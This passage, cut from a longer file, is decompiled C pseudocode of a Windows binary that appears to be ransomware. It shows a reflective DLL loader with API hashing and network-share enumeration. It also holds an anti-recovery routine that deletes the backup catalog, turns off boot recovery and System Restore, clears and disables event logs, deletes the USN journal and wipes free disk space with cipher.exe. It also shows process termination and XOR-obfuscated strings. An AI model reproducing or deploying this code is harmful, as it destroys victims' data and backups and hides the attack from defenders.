  while ( 1 )
  {
    Sleep(0xEA60u);
    sub_403510();
  }
}

//----- (00403920) --------------------------------------------------------
int __thiscall sub_403920(void *this)
{
  int result; // eax
  HANDLE i; // eax
  DWORD ThreadId; // [esp+0h] [ebp-4h] BYREF

  ThreadId = (DWORD)this;
  InitializeCriticalSectionAndSpinCount(&stru_425F70, 0x1F4u);
  result = sub_403510();
  if ( result )
  {
    ThreadId = 0;
    for ( i = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_403900, 0, 0, &ThreadId);
          !i;
          i = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_403900, 0, 0, &ThreadId) )
    {
      Sleep(0x3E8u);
    }
    return CloseHandle(i);
  }
  return result;
}

//----- (004039A0) --------------------------------------------------------
void sub_4039A0()
{
  void *v0; // esp
  int v1; // eax
  char v2; // dl
  CHAR v3[12]; // [esp-Ch] [ebp-110h] BYREF
  CHAR Buffer[260]; // [esp+0h] [ebp-104h] BYREF

  if ( GetSystemWindowsDirectoryA(Buffer, 0x104u) )
  {
    v0 = alloca(12);
    v1 = 0;
    if ( v3 )
    {
      v3[11] = 0;
      do
      {
        v2 = byte_41E030[v1] + (v1 & 0x7F);
        ++v1;
        v3[v1 - 1] = byte_41E03B[v1] ^ v2;
      }
      while ( v1 < 11 );
    }
    PathAppendA(Buffer, v3);
    if ( PathIsDirectoryA(Buffer) )
      sub_404E60(Buffer);
  }
}

//----- (00403A30) --------------------------------------------------------
int __thiscall sub_403A30(void *this)
{
  int v1; // ecx
  _BYTE *v2; // eax
  int v3; // ecx
  _BYTE *v4; // eax
  int result; // eax
  struct _SYSTEMTIME LocalTime; // [esp+8h] [ebp-20h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+18h] [ebp-10h] BYREF

  *(_DWORD *)arglist = 0;
  qword_428BF8 = 0i64;
  sub_403920(this);
  sub_402890();
  sub_4026B0();
  Sleep(0x3A98u);
  if ( !dword_4289DC )
  {
    dword_4289DC = 1;
    if ( sub_401E90() )
    {
      sub_4017E0();
      GetSystemTime(&SystemTime);
      if ( SystemTimeToTzSpecificLocalTime(0, &SystemTime, &LocalTime) )
        dword_424864 = LocalTime.wYear;
      SetErrorMode(0x8003u);
      SetProcessShutdownParameters(0x100u, 0);
    }
  }
  dword_4289E4 = 0;
  dword_4289E0 = 1;
  sub_402040();
  dword_4289E4 = 0;
  dword_4289E0 = 0;
  sub_402040();
  v1 = 512;
  v2 = &unk_425F88;
  do
  {
    *v2++ = 0;
    --v1;
  }
  while ( v1 );
  v3 = 32;
  v4 = &unk_425F50;
  do
  {
    *v4++ = 0;
    --v3;
  }
  while ( v3 );
  dword_424860 = 0;
  Sleep(0x3E8u);
  sub_403180();
  sub_4039A0();
  result = *(_DWORD *)arglist;
  if ( *(_DWORD *)arglist )
  {
    sub_404050();
    sub_404180();
    return *(_DWORD *)arglist;
  }
  return result;
}
// 424860: using guessed type int dword_424860;
// 424864: using guessed type int dword_424864;
// 4289DC: using guessed type int dword_4289DC;
// 4289E0: using guessed type int dword_4289E0;
// 4289E4: using guessed type int dword_4289E4;
// 428BF8: using guessed type __int64 qword_428BF8;

//----- (00403B40) --------------------------------------------------------
void *sub_403B40()
{
  void *retaddr; // [esp+4h] [ebp+4h]

  return retaddr;
}

//----- (00403B50) --------------------------------------------------------
void (__stdcall *__stdcall ReflectiveLoader(void *a1))(int, int, void *)
{
  struct _LIST_ENTRY *v1; // ecx
  char *i; // ebx
  int v3; // eax
  struct _LIST_ENTRY *Flink; // edi
  struct _LIST_ENTRY *v5; // edx
  int Blink_low; // esi
  int v7; // eax
  int v8; // eax
  int Flink_low; // ecx
  struct _LIST_ENTRY *v10; // esi
  int v11; // eax
  _DWORD *v12; // edi
  unsigned __int16 *v13; // ebx
  char v14; // dl
  char *v15; // eax
  int v16; // ecx
  int v17; // eax
  struct _LIST_ENTRY *v18; // edx
  int v19; // eax
  _DWORD *v20; // edi
  unsigned __int16 *v21; // ebx
  char v22; // cl
  char *v23; // eax
  int v24; // esi
  int v25; // edi
  int v26; // edx
  char *v27; // edi
  int v28; // eax
  int v29; // ecx
  int v30; // esi
  _BYTE *v31; // eax
  int v32; // esi
  int v33; // edx
  char *v34; // edi
  int v35; // esi
  _BYTE *v36; // eax
  char *v37; // ecx
  int v38; // esi
  int v39; // ebx
  int v40; // eax
  _DWORD *v41; // esi
  int v42; // eax
  int v43; // ebx
  int v44; // edx
  int *v45; // esi
  int *v46; // ebx
  int v47; // edi
  int v48; // ecx
  int v49; // eax
  int v50; // esi
  int v51; // ecx
  int v52; // eax
  _DWORD *v53; // ecx
  int v54; // edx
  unsigned int v55; // edi
  __int16 *v56; // ebx
  __int16 v57; // ax
  __int16 v58; // cx
  void (__stdcall *v59)(int, int, void *); // esi
  struct _LIST_ENTRY *v61; // [esp+Ch] [ebp-20h]
  struct _LIST_ENTRY *v62; // [esp+10h] [ebp-1Ch]
  int (__stdcall *v63)(int); // [esp+14h] [ebp-18h]
  struct _LIST_ENTRY *v64; // [esp+18h] [ebp-14h]
  char *v65; // [esp+1Ch] [ebp-10h]
  char *v66; // [esp+1Ch] [ebp-10h]
  char *v67; // [esp+1Ch] [ebp-10h]
  char *v68; // [esp+20h] [ebp-Ch]
  struct _LIST_ENTRY *v69; // [esp+24h] [ebp-8h]
  _DWORD *v70; // [esp+24h] [ebp-8h]
  _DWORD *v71; // [esp+24h] [ebp-8h]
  __int16 v72; // [esp+28h] [ebp-4h]
  __int16 v73; // [esp+28h] [ebp-4h]
  int v74; // [esp+28h] [ebp-4h]

  v63 = 0;
  v62 = 0;
  v64 = 0;
  v61 = 0;
  for ( i = (char *)sub_403B40(); ; --i )
  {
    if ( *(_WORD *)i == 23117 )
    {
      v3 = *((_DWORD *)i + 15);
      if ( (unsigned int)(v3 - 64) <= 0x3BF && *(_DWORD *)&i[v3] == 17744 )
        break;
    }
  }
  Flink = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink;
  v68 = i;
  v69 = Flink;
  if ( Flink != v1 )
  {
    while ( 1 )
    {
      v5 = Flink[5].Flink;
      Blink_low = LOWORD(Flink[4].Blink);
      v7 = 0;
      do
      {
        v8 = __ROR4__(v7, 13);
        Flink_low = LOBYTE(v5->Flink);
        if ( LOBYTE(v5->Flink) < 0x61u )
          v7 = Flink_low + v8;
        else
          v7 = v8 + Flink_low - 32;
        Blink_low += 0xFFFF;
        v5 = (struct _LIST_ENTRY *)((char *)v5 + 1);
      }
      while ( (_WORD)Blink_low );
      if ( v7 == 1783282779 )
      {
        v10 = Flink[2].Flink;
        v11 = *(int *)((char *)&v10[7].Blink[15].Flink + (unsigned int)v10);
        v12 = (struct _LIST_ENTRY **)((char *)&v10->Flink + *(unsigned int *)((char *)&v10[4].Flink + v11));
        v65 = (char *)v10 + v11;
        v13 = (unsigned __int16 *)((char *)v10 + *(unsigned int *)((char *)&v10[4].Blink + v11));
        v72 = 3;
        do
        {
          v14 = *((_BYTE *)&v10->Flink + *v12);
          v15 = (char *)v10 + *v12;
          v16 = 0;
          do
          {
            ++v15;
            v16 = v14 + __ROR4__(v16, 13);
            v14 = *v15;
          }
          while ( *v15 );
          if ( v16 == -334606706 || v16 == 2081291434 || v16 == -1850750380 )
          {
            v17 = *((_DWORD *)v65 + 7) + 4 * *v13;
            if ( v16 == -334606706 )
            {
              v63 = (int (__stdcall *)(int))((char *)v10 + *(unsigned int *)((char *)&v10->Flink + v17));
            }
            else if ( v16 == 2081291434 )
            {
              v62 = (struct _LIST_ENTRY *)((char *)v10 + *(unsigned int *)((char *)&v10->Flink + v17));
            }
            else
            {
              v64 = (struct _LIST_ENTRY *)((char *)v10 + *(unsigned int *)((char *)&v10->Flink + v17));
            }
            --v72;
          }
          ++v12;
          ++v13;
        }
        while ( v72 );
      }
      else
      {
        if ( v7 != 1023043677 )
          goto LABEL_37;
        v18 = Flink[2].Flink;
        v19 = *(int *)((char *)&v18[7].Blink[15].Flink + (unsigned int)v18);
        v20 = (struct _LIST_ENTRY **)((char *)&v18->Flink + *(unsigned int *)((char *)&v18[4].Flink + v19));
        v66 = (char *)v18 + v19;
        v21 = (unsigned __int16 *)((char *)v18 + *(unsigned int *)((char *)&v18[4].Blink + v19));
        v73 = 1;
        do
        {
          v22 = *((_BYTE *)&v18->Flink + *v20);
          v23 = (char *)v18 + *v20;
          v24 = 0;
          do
          {
            ++v23;
            v24 = v22 + __ROR4__(v24, 13);
            v22 = *v23;
          }
          while ( *v23 );
          if ( v24 == 1397492408 )
          {
            --v73;
            v61 = (struct _LIST_ENTRY *)((char *)v18
                                       + *(unsigned int *)((char *)&v18->Flink + 4 * *v21 + *((_DWORD *)v66 + 7)));
          }
          ++v20;
          ++v21;
        }
        while ( v73 );
      }
      i = v68;
      Flink = v69;
LABEL_37:
      if ( v63 && v62 && v64 && v61 || (v69 = Flink->Flink) == 0 )
      {
        v1 = 0;
        break;
      }
      Flink = Flink->Flink;
    }
  }
  v25 = *((_DWORD *)i + 15);
  v26 = *(_DWORD *)&i[v25 + 80];
  v27 = &i[v25];
  v67 = v27;
  v28 = ((int (__stdcall *)(struct _LIST_ENTRY *, int, int, int))v64)(v1, v26, 12288, 64);
  v29 = *((_DWORD *)v27 + 21);
  v30 = v28;
  v74 = v28;
  v31 = i;
  if ( v29 )
  {
    v32 = v30 - (_DWORD)i;
    do
    {
      v31[v32] = *v31;
      ++v31;
      --v29;
    }
    while ( v29 );
  }
  v33 = *((unsigned __int16 *)v27 + 3);
  if ( *((_WORD *)v27 + 3) )
  {
    v34 = &v27[*((unsigned __int16 *)v27 + 10) + 44];
    do
    {
      v35 = *((_DWORD *)v34 - 1);
      v36 = (_BYTE *)(v74 + *((_DWORD *)v34 - 2));
      --v33;
      v37 = &i[*(_DWORD *)v34];
      if ( v35 )
      {
        do
        {
          *v36++ = *v37++;
          --v35;
        }
        while ( v35 );
        i = v68;
      }
      v34 += 40;
    }
    while ( v33 );
    v27 = v67;
  }
  v38 = *((_DWORD *)v27 + 32);
  v39 = v74;
  v40 = *(_DWORD *)(v38 + v74 + 12);
  v41 = (_DWORD *)(v74 + v38);
  v70 = v41;
  if ( v40 )
  {
    while ( 1 )
    {
      v42 = v63(v39 + v40);
      v43 = *v41;
      v44 = v74;
      v45 = (int *)(v74 + v41[4]);
      v46 = (int *)(v74 + v43);
      v47 = v42;
      while ( *v45 )
      {
        if ( v46 && *v46 < 0 )
        {
          v48 = *(_DWORD *)(*(_DWORD *)(v47 + 60) + v47 + 120);
          *v45 = v47
               + *(_DWORD *)(*(_DWORD *)(v48 + v47 + 28)
                           + 4 * ((unsigned __int16)*v46 - *(_DWORD *)(v48 + v47 + 16))
                           + v47);
        }
        else
        {
          v49 = ((int (__stdcall *)(int, int))v62)(v47, v44 + *v45 + 2);
          v44 = v74;
          *v45 = v49;
        }
        ++v45;
        if ( v46 )
          ++v46;
      }
      v39 = v74;
      v70 += 5;
      v40 = v70[3];
      if ( !v40 )
        break;
      v41 = v70;
    }
    v27 = v67;
  }
  v50 = v39 - *((_DWORD *)v27 + 13);
  if ( *((_DWORD *)v27 + 41) )
  {
    v51 = *((_DWORD *)v27 + 40);
    v52 = *(_DWORD *)(v51 + v39 + 4);
    v53 = (_DWORD *)(v39 + v51);
    v71 = v53;
    if ( v52 )
    {
      do
      {
        v54 = v39 + *v53;
        v55 = (unsigned int)(v52 - 8) >> 1;
        v56 = (__int16 *)(v53 + 2);
        if ( v55 )
        {
          do
          {
            v57 = *v56;
            v58 = (unsigned __int16)*v56 >> 12;
            --v55;
            switch ( v58 )
            {
              case 10:
                *(_DWORD *)((v57 & 0xFFF) + v54) += v50;
                break;
              case 3:
                *(_DWORD *)((v57 & 0xFFF) + v54) += v50;
                break;
              case 1:
                *(_WORD *)((v57 & 0xFFF) + v54) += HIWORD(v50);
                break;
              case 2:
                *(_WORD *)((v57 & 0xFFF) + v54) += v50;
                break;
            }
            ++v56;
          }
          while ( v55 );
          v53 = v71;
        }
        v53 = (_DWORD *)((char *)v53 + v53[1]);
        v39 = v74;
        v52 = v53[1];
        v71 = v53;
      }
      while ( v52 );
      v27 = v67;
    }
  }
  v59 = (void (__stdcall *)(int, int, void *))(v39 + *((_DWORD *)v27 + 10));
  ((void (__stdcall *)(int, _DWORD, _DWORD))v61)(-1, 0, 0);
  v59(v39, 1, a1);
  return v59;
}
// 403C7D: conditional instruction was optimized away because ecx.4==91AFCA54
// 403BA9: variable 'v1' is possibly undefined

//----- (00403F20) --------------------------------------------------------
int __cdecl sub_403F20(LPNETRESOURCEW lpNetResource)
{
  int result; // eax
  HANDLE ProcessHeap; // eax
  _WORD **v3; // esi
  DWORD v4; // edi
  __int16 **v5; // esi
  __int16 *v6; // eax
  HANDLE v8; // eax
  _WORD *v9; // eax
  __int16 *v10; // edx
  __int16 v11; // cx
  HANDLE v12; // eax
  SIZE_T v13; // [esp-10h] [ebp-20h]
  _WORD **v14; // [esp+0h] [ebp-10h]
  DWORD BufferSize; // [esp+4h] [ebp-Ch] BYREF
  HANDLE hEnum; // [esp+8h] [ebp-8h] BYREF
  DWORD cCount; // [esp+Ch] [ebp-4h] BYREF

  result = WNetOpenEnumW(2u, 1u, 0, lpNetResource, &hEnum);
  if ( !result )
  {
    BufferSize = 4096;
    ProcessHeap = GetProcessHeap();
    v3 = (_WORD **)HeapAlloc(ProcessHeap, 8u, 0x1080u);
    v14 = v3;
    if ( v3 )
    {
      while ( 1 )
      {
        cCount = -1;
        if ( WNetEnumResourceW(hEnum, &cCount, v3, &BufferSize) )
          break;
        v4 = 0;
        if ( cCount )
        {
          v5 = v3 + 5;
          do
          {
            if ( (*(_BYTE *)(v5 - 3) & 3) != 0 && (*(_BYTE *)(v5 - 2) & 1) != 0 )
            {
              v6 = *v5;
              while ( *v6++ )
                ;
              v13 = 2 * (v6 - (*v5 + 1)) + 148;
              v8 = GetProcessHeap();
              v9 = HeapAlloc(v8, 8u, v13);
              dword_428C00[dword_429C00] = (int)v9;
              if ( v9 )
              {
                v10 = *v5;
                do
                {
                  v11 = *v10;
                  *v9++ = *v10++;
                }
                while ( v11 );
                ++dword_429C00;
              }
            }
            if ( (*(_BYTE *)(v5 - 2) & 2) == 2 )
              sub_403F20((LPNETRESOURCEW)(v5 - 5));
            ++v4;
            v5 += 8;
          }
          while ( v4 < cCount );
          v3 = v14;
        }
      }
      v12 = GetProcessHeap();
      HeapFree(v12, 0, v3);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}
// 428C00: using guessed type int dword_428C00[1024];
// 429C00: using guessed type int dword_429C00;

//----- (00404050) --------------------------------------------------------
DWORD sub_404050()
{
  DWORD result; // eax
  WCHAR *p_Buffer; // esi
  bool v2; // zf
  WCHAR v3[260]; // [esp+0h] [ebp-654h] BYREF
  WCHAR v4[260]; // [esp+208h] [ebp-44Ch] BYREF
  WCHAR Buffer; // [esp+410h] [ebp-244h] BYREF
  char v6[518]; // [esp+412h] [ebp-242h] BYREF
  SHELLEXECUTEINFOW pExecInfo; // [esp+618h] [ebp-3Ch] BYREF

  result = sub_404500();
  if ( !result )
  {
    Buffer = 0;
    sub_413EB0((int)v6, 0, 0x206u);
    result = GetLogicalDriveStringsW(0x104u, &Buffer);
    if ( result )
    {
      for ( result = 0; result < 0x104; ++result )
      {
        if ( *(_WORD *)&v6[2 * result - 2] == 92 )
          *(_WORD *)&v6[2 * result - 2] = 0;
      }
      p_Buffer = &Buffer;
      if ( Buffer )
      {
        do
        {
          wsprintfW(v3, L"/w:%s", p_Buffer);
          sub_413EB0((int)&pExecInfo, 0, 0x3Cu);
          pExecInfo.cbSize = 60;
          pExecInfo.nShow = 0;
          GetSystemDirectoryW(v4, 0x104u);
          pExecInfo.lpDirectory = v4;
          pExecInfo.lpFile = L"cipher.exe";
          pExecInfo.lpParameters = v3;
          pExecInfo.fMask = 0x100000;
          ShellExecuteExW(&pExecInfo);
          result = wcslen(p_Buffer);
          v2 = p_Buffer[result + 2] == 0;
          p_Buffer += result + 2;
        }
        while ( !v2 );
      }
    }
  }
  return result;
}
// 41E060: using guessed type wchar_t aCipherExe[11];
// 404050: using guessed type char var_242[518];

//----- (00404180) --------------------------------------------------------
PVOID sub_404180()
{
  int v0; // esi
  PVOID result; // eax
  const WCHAR *v2; // edi
  int v3; // ebx
  const WCHAR *v4; // eax
  const CHAR *v5; // ecx
  int v6; // esi
  int v7; // eax
  const CHAR *v8; // [esp-14h] [ebp-2C4h]
  PVOID OldValue; // [esp+Ch] [ebp-2A4h] BYREF
  int pvData; // [esp+10h] [ebp-2A0h] BYREF
  SHELLEXECUTEINFOW pExecInfo; // [esp+14h] [ebp-29Ch] BYREF
  const wchar_t *v12; // [esp+50h] [ebp-260h]
  int v13[21]; // [esp+54h] [ebp-25Ch]
  struct _OSVERSIONINFOW VersionInformation; // [esp+A8h] [ebp-208h] BYREF

  v0 = 0;
  sub_413EB0((int)&VersionInformation, 0, 0x11Cu);
  VersionInformation.dwOSVersionInfoSize = 284;
  result = (PVOID)GetVersionExW(&VersionInformation);
  if ( result && VersionInformation.dwMajorVersion >= 6 )
  {
    OldValue = 0;
    if ( sub_404970() )
      Wow64DisableWow64FsRedirection(&OldValue);
    v13[1] = (int)L"bcdedit.exe";
    v13[3] = (int)L"bcdedit.exe";
    v2 = L"wbadmin.exe";
    v12 = L"wbadmin.exe";
    v13[0] = (int)L"delete catalog -quiet";
    v13[2] = (int)L"/set {default} recoveryenabled no";
    v13[4] = (int)L"/set {default} bootstatuspolicy ignoreallfailures";
    v13[5] = (int)L"schtasks.exe";
    v13[6] = (int)L"/Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable";
    v13[7] = (int)L"wevtutil.exe";
    v13[8] = (int)L"cl Application";
    v13[9] = (int)L"wevtutil.exe";
    v13[10] = (int)L"cl System";
    v13[11] = (int)L"wevtutil.exe";
    v13[12] = (int)L"cl Setup";
    v13[13] = (int)L"wevtutil.exe";
    v13[14] = (int)L"cl Security";
    v13[15] = (int)L"wevtutil.exe";
    v13[16] = (int)L"sl Security /e:false";
    v13[17] = (int)L"fsutil.exe";
    v13[18] = (int)L"usn deletejournal /D C:";
    v13[19] = 0;
    v13[20] = 0;
    v3 = 0;
    do
    {
      sub_413EB0((int)&pExecInfo, 0, 0x3Cu);
      pExecInfo.cbSize = 60;
      pExecInfo.nShow = 0;
      GetSystemDirectoryW((LPWSTR)&VersionInformation, 0x104u);
      v4 = (const WCHAR *)v13[v0];
      pExecInfo.lpDirectory = (LPCWSTR)&VersionInformation;
      pExecInfo.lpFile = v2;
      pExecInfo.lpParameters = v4;
      pExecInfo.fMask = 0x100000;
      ShellExecuteExW(&pExecInfo);
      ++v3;
      v0 = 2 * v3;
      v2 = (const WCHAR *)v13[2 * v3 - 1];
    }
    while ( v2 );
    v5 = "SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore";
    pExecInfo.fMask = (ULONG)"DisableConfig";
    pExecInfo.lpParameters = (LPCWSTR)"DisableConfig";
    pExecInfo.lpFile = (LPCWSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore";
    pExecInfo.lpDirectory = (LPCWSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore";
    v6 = 0;
    pExecInfo.cbSize = (DWORD)"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore";
    pExecInfo.hwnd = (HWND)"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore";
    pExecInfo.lpVerb = (LPCWSTR)"DisableSR";
    pExecInfo.nShow = (int)"DisableSR";
    pExecInfo.hInstApp = 0;
    pExecInfo.lpIDList = 0;
    v7 = 0;
    do
    {
      v8 = *(const CHAR **)((char *)&pExecInfo.fMask + v7);
      pvData = 1;
      SHRegSetUSValueA(v5, v8, 4u, &pvData, 4u, 4u);
      ++v6;
      v7 = 8 * v6;
      v5 = (const CHAR *)*(&pExecInfo.cbSize + 2 * v6);
    }
    while ( v5 );
    result = OldValue;
    if ( OldValue )
      return (PVOID)Wow64RevertWow64FsRedirection(OldValue);
  }
  return result;
}
// 41E078: using guessed type wchar_t aWbadminExe[12];
// 41E090: using guessed type wchar_t aDeleteCatalogQ[22];
// 41E0BC: using guessed type wchar_t aBcdeditExe[12];
// 41E0D8: using guessed type wchar_t aSetDefaultReco[34];
// 41E120: using guessed type wchar_t aSetDefaultBoot[50];
// 41E184: using guessed type wchar_t aSchtasksExe[13];
// 41E1A0: using guessed type wchar_t aChangeTnMicros[59];
// 41E218: using guessed type wchar_t aWevtutilExe[13];
// 41E234: using guessed type wchar_t aClApplication[15];
// 41E254: using guessed type wchar_t aClSystem[10];
// 41E268: using guessed type wchar_t aClSetup[9];
// 41E27C: using guessed type wchar_t aClSecurity[12];
// 41E294: using guessed type wchar_t aSlSecurityEFal[21];
// 41E2C0: using guessed type wchar_t aFsutilExe[11];
// 41E2D8: using guessed type wchar_t aUsnDeletejourn[24];

//----- (004043B0) --------------------------------------------------------
BOOL __usercall sub_4043B0@<eax>(const BYTE *a1@<eax>, DWORD dwDataLen, BYTE *a3)
{
  BOOL HashParam; // ebx
  DWORD pdwDataLen; // [esp+8h] [ebp-10h] BYREF
  BYTE pbData[4]; // [esp+Ch] [ebp-Ch] BYREF
  HCRYPTPROV phProv; // [esp+10h] [ebp-8h] BYREF
  HCRYPTHASH phHash; // [esp+14h] [ebp-4h] BYREF

  HashParam = 0;
  phProv = 0;
  phHash = 0;
  *(_DWORD *)pbData = 0;
  pdwDataLen = 4;
  if ( !a1 || !dwDataLen || !a3 )
    return HashParam;
  if ( !CryptAcquireContextA(&phProv, 0, 0, 1u, 0xF0000000)
    || !phProv
    || !CryptCreateHash(phProv, 0x8003u, 0, 0, &phHash) )
  {
    goto LABEL_11;
  }
  if ( phHash )
  {
    if ( CryptHashData(phHash, a1, dwDataLen, 0) && CryptGetHashParam(phHash, 4u, pbData, &pdwDataLen, 0) )
      HashParam = CryptGetHashParam(phHash, 2u, a3, (DWORD *)pbData, 0);
LABEL_11:
    if ( phHash )
      CryptDestroyHash(phHash);
  }
  if ( phProv )
    CryptReleaseContext(phProv, 0);
  return HashParam;
}

//----- (00404490) --------------------------------------------------------
int __usercall sub_404490@<eax>(int result@<eax>, int a2)
{
  CHAR *v2; // ebx
  void *v3; // esp
  unsigned int i; // esi
  char v5[20]; // [esp-8h] [ebp-18h] BYREF
  int cchDest; // [esp+Ch] [ebp-4h]

  v2 = (CHAR *)result;
  if ( a2 && result )
  {
    v3 = alloca(8);
    if ( v5 )
      strcpy(v5, "%02x");
    cchDest = strlen(v5);
    for ( i = 0; i < 0x10; ++i )
    {
      result = wnsprintfA(v2, cchDest, v5, *(unsigned __int8 *)(i + a2));
      v2 += 2;
    }
  }
  return result;
}

//----- (00404500) --------------------------------------------------------
DWORD sub_404500()
{
  DWORD th32ProcessID; // edi
  HANDLE Toolhelp32Snapshot; // eax
  void *v2; // esi
  PROCESSENTRY32 pe; // [esp+10h] [ebp-128h] BYREF

  th32ProcessID = 0;
  pe.dwSize = 0;
  sub_413EB0((int)&pe.cntUsage, 0, 0x124u);
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
  v2 = Toolhelp32Snapshot;
  if ( Toolhelp32Snapshot == (HANDLE)-1 )
  {
    GetLastError();
    return 0;
  }
  else
  {
    pe.dwSize = 296;
    if ( Process32First(Toolhelp32Snapshot, &pe) )
    {
      while ( !StrStrIA(pe.szExeFile, "cipher.exe") )
      {
        if ( !Process32Next(v2, &pe) )
        {
          CloseHandle(v2);
          return 0;
        }
      }
      th32ProcessID = pe.th32ProcessID;
    }
    CloseHandle(v2);
    return th32ProcessID;
  }
}

//----- (004045C0) --------------------------------------------------------
int __usercall sub_4045C0@<eax>(DWORD a1@<edi>, UINT uExitCode)
{
  HANDLE v2; // esi
  void *v3; // esp
  HMODULE ModuleHandleA; // eax
  char v6[20]; // [esp-Ch] [ebp-20h] BYREF
  ULONG ReturnLength; // [esp+8h] [ebp-Ch] BYREF
  int ProcessInformation; // [esp+Ch] [ebp-8h] BYREF
  int v9; // [esp+10h] [ebp-4h]

  v9 = 0;
  if ( a1 )
  {
    if ( a1 == GetCurrentProcessId() )
      ExitProcess(0);
    v2 = OpenProcess(1u, 0, a1);
    if ( v2 )
    {
      ProcessInformation = 0;
      ReturnLength = 0;
      if ( ZwQueryInformationProcess(v2, ProcessBreakOnTermination, &ProcessInformation, 4u, &ReturnLength) >= 0
        && ProcessInformation )
      {
        goto LABEL_13;
      }
      if ( TerminateProcess(v2, uExitCode) )
      {
LABEL_12:
        v9 = 1;
LABEL_13:
        CloseHandle(v2);
        return v9;
      }
      CloseHandle(v2);
      v2 = OpenProcess(0x10043Au, 0, a1);
      if ( v2 )
      {
        v3 = alloca(12);
        if ( v6 )
          strcpy(v6, "ntdll.dll");
        ModuleHandleA = GetModuleHandleA(v6);
        if ( ZwUnmapViewOfSection(v2, ModuleHandleA) < 0 )
          goto LABEL_13;
        goto LABEL_12;
      }
    }
  }
  return v9;
}

//----- (004046B0) --------------------------------------------------------
int sub_4046B0()
{
  int result; // eax
  char *FileNameA; // eax
  unsigned int v2; // esi
  LPSTR v3; // eax
  LPSTR v4; // ecx
  unsigned int v5; // eax
  int i; // edx
  CHAR Filename[260]; // [esp+0h] [ebp-104h] BYREF

  result = dword_429C04;
  if ( !dword_429C04 )
  {
    if ( GetModuleFileNameA(0, Filename, 0x104u) && (FileNameA = PathFindFileNameA(Filename)) != 0 )
    {
      v2 = strlen(FileNameA);
      v3 = CharLowerA(FileNameA);
      if ( v3 && v2 )
      {
        v4 = v3;
        v5 = -1;
        for ( i = v2; i > 0; ++v4 )
        {
          v5 = dword_4205D0[(unsigned __int8)(v5 ^ *v4)] ^ (v5 >> 8);
          --i;
        }
        result = ~v5;
        dword_429C04 = result;
      }
      else
      {
        result = 0;
        dword_429C04 = 0;
      }
    }
    else
    {
      return dword_429C04;
    }
  }
  return result;
}
// 4205D0: using guessed type int dword_4205D0[128];
// 429C04: using guessed type int dword_429C04;

//----- (00404760) --------------------------------------------------------
BOOL sub_404760()
{
  void *v0; // esp
  int v1; // eax
  char v2; // bl
  void *v3; // esp
  int v4; // eax
  int v5; // ebx
  char v6; // dl
  HMODULE ModuleHandleA; // eax
  FARPROC ProcAddress; // eax
  HANDLE CurrentProcess; // eax
  BOOL result; // eax
  PSECURITY_DESCRIPTOR v11; // [esp-4Ch] [ebp-6Ch]
  CHAR v12[16]; // [esp-48h] [ebp-68h] BYREF
  CHAR v13[68]; // [esp-38h] [ebp-58h] BYREF
  int v14; // [esp+Ch] [ebp-14h]
  int v15; // [esp+10h] [ebp-10h]
  int v16; // [esp+14h] [ebp-Ch]
  int v17; // [esp+18h] [ebp-8h]
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+1Ch] [ebp-4h] BYREF

  v0 = alloca(56);
  if ( v13 )
  {
    v1 = 0;
    v13[52] = 0;
    do
    {
      v13[v1] = byte_41E3F0[v1] ^ (byte_41E3B8[v1] + (v1 & 0x7F));
      byte_41E3BB[v13 - byte_41E3BA + v1] = byte_41E3F1[v1] ^ (byte_41E3B9[v1] + ((v1 + 1) & 0x7F));
      byte_41E3BD[v13 - byte_41E3BB + v1] = byte_41E3F2[v1] ^ (byte_41E3BA[v1] + ((v1 + 2) & 0x7F));
      v2 = byte_41E3BB[v1] + ((v1 + 3) & 0x7F);
      v1 += 4;
      v13[v1 - 1] = byte_41E3EF[v1] ^ v2;
    }
    while ( v1 < 52 );
  }
  v3 = alloca(16);
  v4 = 0;
  if ( v12 )
  {
    v17 = v12 - byte_41E42A + 1;
    v16 = v12 - byte_41E42B + 2;
    v15 = v12 - byte_41E42C + 3;
    v12[12] = 0;
    v14 = v12 - byte_41E42D + 4;
    do
    {
      v5 = v17;
      v12[v4] = byte_41E438[v4] ^ (byte_41E428[v4] + (v4 & 0x7F));
      byte_41E42A[v5 + v4] = byte_41E439[v4] ^ (byte_41E429[v4] + ((v4 + 1) & 0x7F));
      byte_41E42B[v16 + v4] = byte_41E43A[v4] ^ (byte_41E42A[v4] + ((v4 + 2) & 0x7F));
      byte_41E42C[v15 + v4] = byte_41E43B[v4] ^ (byte_41E42B[v4] + ((v4 + 3) & 0x7F));
      byte_41E42D[v14 + v4] = byte_41E43C[v4] ^ (byte_41E42C[v4] + ((v4 + 4) & 0x7F));
      v6 = byte_41E42D[v4] + ((v4 + 5) & 0x7F);
      v4 += 6;
      v12[v4 - 1] = byte_41E437[v4] ^ v6;
    }
    while ( v4 < 12 );
  }
  ModuleHandleA = GetModuleHandleA(v12);
  ProcAddress = GetProcAddress(ModuleHandleA, v13);
  dword_429C08 = (int)ProcAddress;
  result = 0;
  if ( ProcAddress )
  {
    SecurityDescriptor = 0;
    if ( ((int (__stdcall *)(const wchar_t *, int, PSECURITY_DESCRIPTOR *, _DWORD))ProcAddress)(
           L"D:P",
           1,
           &SecurityDescriptor,
           0) )
    {
      v11 = SecurityDescriptor;
      CurrentProcess = GetCurrentProcess();
      if ( SetKernelObjectSecurity(CurrentProcess, 4u, v11) )
        return 1;
    }
  }
  return result;
}
// 41E448: using guessed type wchar_t aDP[4];
// 429C08: using guessed type int dword_429C08;

//----- (00404970) --------------------------------------------------------
int sub_404970()
{
  void *v0; // esp
  int v1; // eax
  int v2; // ebx
  char v3; // dl
  HMODULE ModuleHandleA; // edi
  void *v5; // esp
  int v6; // eax
  char v7; // dl
  HANDLE CurrentProcess; // eax
  CHAR v10[16]; // [esp-10h] [ebp-50h] BYREF
  CHAR v11[12]; // [esp+0h] [ebp-40h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+Ch] [ebp-34h] BYREF
